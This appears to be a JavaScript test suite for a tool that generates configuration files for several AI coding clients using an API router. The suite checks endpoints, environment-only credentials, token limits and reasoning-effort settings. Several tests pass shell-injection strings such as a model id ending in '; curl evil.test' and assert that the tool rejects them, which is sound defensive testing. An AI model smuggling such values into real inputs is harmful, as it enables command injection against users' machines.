import assert from "node:assert/strict";
import test from "node:test";
import { execFileSync } from "node:child_process";
import { parse } from "yaml";
import { createOpenAICompatible } from "@ai-sdk/openai-compatible";
import { centsFromText, setupFor } from "../setup.mjs";

const model = { id: "deepseek/deepseek-flash", name: "DeepSeek Flash", context: 128000, output: 8192 };
const base = "https://api.lightningrouter.ai/v1";

for (const [text, cents] of [["10", 1000], ["0.01", 1], ["5.5", 550], ["1000.00", 100000]]) {
  test(`exact cents ${text}`, () => assert.equal(centsFromText(text), cents));
}
for (const text of ["0", "1e2", "1.001", "Infinity", "-1", "1000.01", "1abc", ""]) {
  test(`reject invalid money ${text}`, () => assert.throws(() => centsFromText(text)));
}
for (const agent of ["opencode", "crush", "omp"]) {
  test(`${agent} has exact endpoint/model and environment-only credential`, () => {
    const result = setupFor(agent, model, base);
    assert.ok(result.config.includes(base));
    assert.ok(result.config.includes(model.id));
    assert.ok(result.config.includes("LIGHTNINGROUTER_API_KEY"));
    assert.ok(!result.config.includes("sk-tr-"));
    assert.ok(!result.config.includes("openrouter.ai"));
  });
}
test("OpenCode shape", () => {
  const json = JSON.parse(setupFor("opencode", model, base).config);
  assert.equal(json.provider.lightningrouter.npm, "@ai-sdk/openai-compatible");
  assert.equal(json.model, "lightningrouter/" + model.id);
});
test("Crush selects the custom provider", () => {
  const json = JSON.parse(setupFor("crush", model, base).config);
  assert.equal(json.models.large.provider, "lightningrouter");
  assert.equal(json.providers.lightningrouter.type, "openai-compat");
});
test("OMP uses current YAML file and explicit bearer", () => {
  const result = setupFor("omp", model, base);
  assert.equal(result.path, "~/.omp/agent/models.yml");
  assert.ok(result.config.includes("authHeader: true"));
});
test("model change updates every config", () => {
  for (const agent of ["opencode", "crush", "omp"]) {
    const result = setupFor(agent, { ...model, id: "kimi/kimi-k2.7" }, base);
    assert.ok(!result.config.includes(model.id));
    assert.ok(result.config.includes("kimi/kimi-k2.7"));
  }
});

test("DeepSeek default budget is separate from its documented output capacity", () => {
  const deepseek = { ...model, id: "deepseek/deepseek-v4.1-flash", context: 1048576, output: 393216, default_output: 65536 };
  const crush = JSON.parse(setupFor("crush", deepseek, base).config);
  assert.equal(crush.providers.lightningrouter.models[0].default_max_tokens, 65536);
  const opencode = JSON.parse(setupFor("opencode", deepseek, base).config);
  assert.equal(opencode.provider.lightningrouter.models[deepseek.id].limit.output, 393216);
  assert.ok(setupFor("omp", deepseek, base).config.includes("maxTokens: 393216"));
});

test("unknown limits never become a fictional 4096 token model cap", () => {
  for (const agent of ["opencode", "crush", "omp"]) {
    const result = setupFor(agent, { ...model, context: null, output: null }, base);
    assert.ok(!result.config.includes("4096"));
    assert.ok(!result.config.includes("32768"));
    assert.ok(!result.config.includes("default_max_tokens"));
    assert.ok(!result.config.includes("maxTokens:"));
    assert.ok(!result.config.includes('"limit"'));
  }
});
test("malicious model cannot escape shell commands", () => {
  assert.throws(() => setupFor("omp", { ...model, id: "x'; curl evil.test" }, base));
});

// Consume the production registry, not a second set of hand-maintained fixtures.
const profiles = JSON.parse(execFileSync(".venv/bin/python", ["-c",
  "import json; from lightning_router.reasoning import PROFILES; print(json.dumps(PROFILES))"], {encoding: "utf8"}));
for (const [id, reasoning] of Object.entries(profiles)) {
  test(`${id}: config matches reviewed controls for each client`, () => {
    const selected = {...model, id, reasoning};
    const code = JSON.parse(setupFor("opencode", selected, base).config).provider.lightningrouter.models[id];
    const crush = JSON.parse(setupFor("crush", selected, base).config);
    const omp = setupFor("omp", selected, base);
    const pi = parse(omp.config).providers.lightningrouter.models[0];
    if (reasoning.setup_default) {
      assert.equal(code.options.reasoningEffort, reasoning.setup_default);
      assert.deepEqual(Object.entries(code.variants).filter(([,v]) => !v.disabled).map(([k]) => k), reasoning.setup_efforts);
      assert.deepEqual(crush.providers.lightningrouter.models[0].reasoning_levels, reasoning.setup_efforts);
      for (const role of ["large", "small"]) assert.equal(crush.models[role].reasoning_effort, reasoning.setup_default);
      assert.deepEqual(pi.thinking.efforts, reasoning.setup_efforts.filter(value => value !== "none"));
      assert.equal(pi.thinking.requiresEffort, !reasoning.setup_efforts.includes("none"));
      assert.ok(omp.command.endsWith(` --thinking ${reasoning.setup_default === "none" ? "off" : reasoning.setup_default}`));
    } else {
      assert.equal(code.options, undefined);
      assert.ok(Object.values(code.variants).every(value => value.disabled));
      assert.equal(crush.models.large.reasoning_effort, undefined);
      assert.equal(pi.compat.supportsReasoningParams, false);
      assert.ok(!omp.command.includes("--thinking"));
    }
  });
  if (reasoning.setup_default) test(`${id}: actual OpenCode provider serializes the effort on the wire`, async () => {
    const config = JSON.parse(setupFor("opencode", {...model, id, reasoning}, base).config);
    const providerConfig = config.provider.lightningrouter;
    for (const effort of reasoning.setup_efforts) {
      let sent;
      const provider = createOpenAICompatible({name: "lightningrouter", baseURL: providerConfig.options.baseURL,
        apiKey: "local-fake-key", fetch: async (url, init) => {
          assert.equal(url, base + "/chat/completions");
          sent = JSON.parse(init.body);
          return new Response('data: [DONE]\n\n', {headers: {"Content-Type": "text/event-stream"}});
        }});
      await provider.chatModel(id).doStream({prompt: [{role: "user", content: [{type: "text", text: "hi"}]}],
        providerOptions: {lightningrouter: providerConfig.models[id].variants[effort]}});
      assert.equal(sent.reasoning_effort, effort);
      assert.equal(sent.model, id);
      assert.equal(sent.reasoningEffort, undefined);
    }
  });
}
for (const agent of ["opencode", "crush", "omp"]) {
  test(`${agent} advertised boolean alone never generates effort`, () => {
    const config = setupFor(agent, {...model, reasoning_effort: true}, base).config;
    assert.ok(!config.includes('"reasoningEffort"'));
    assert.ok(!config.includes('"reasoning_effort"'));
    assert.ok(!config.includes("efforts:"));
  });
  test(`${agent} rejects malformed reviewed controls`, () => {
    assert.throws(() => setupFor(agent, {...model, reasoning: {status: "reviewed", setup_efforts: ["high; curl evil.test"], setup_default: "high; curl evil.test"}}, base));
    assert.throws(() => setupFor(agent, {...model, reasoning: {status: "reviewed", setup_efforts: ["low"], setup_default: "max"}}, base));
  });
}
